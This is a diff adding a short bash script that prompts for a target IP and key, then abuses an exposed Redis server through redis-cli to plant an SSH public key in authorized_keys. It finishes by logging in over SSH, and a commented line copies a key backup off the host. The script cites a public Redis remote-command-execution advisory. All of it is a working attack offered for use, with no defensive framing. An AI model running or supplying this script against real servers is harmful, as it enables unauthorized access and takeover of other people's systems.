@@ -1,0 +1,13 @@
+read -p 'Enter PrivateKey filename: ' privatekey
+read -p 'Enter Username on Target IP: ' user
+read -p 'Enter Target IP: ' targetip
+#foo.txt contains the publickey data there needs to be two lines above and underneat \n\n publickey \n\n
+#More information: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+cat foo.txt | redis-cli -h $targetip -x set crackit
+redis-cli -h $targetip config set dir /var/lib/redis/.ssh
+redis-cli -h $targetip config get dir
+redis-cli -h $targetip config set dbfilename "authorized_keys"
+redis-cli -h $targetip save
+#scp -i $privatekey $user@$targetip:/opt/id_rsa.bak /tmp
+ssh -i $privatekey $user@$targetip
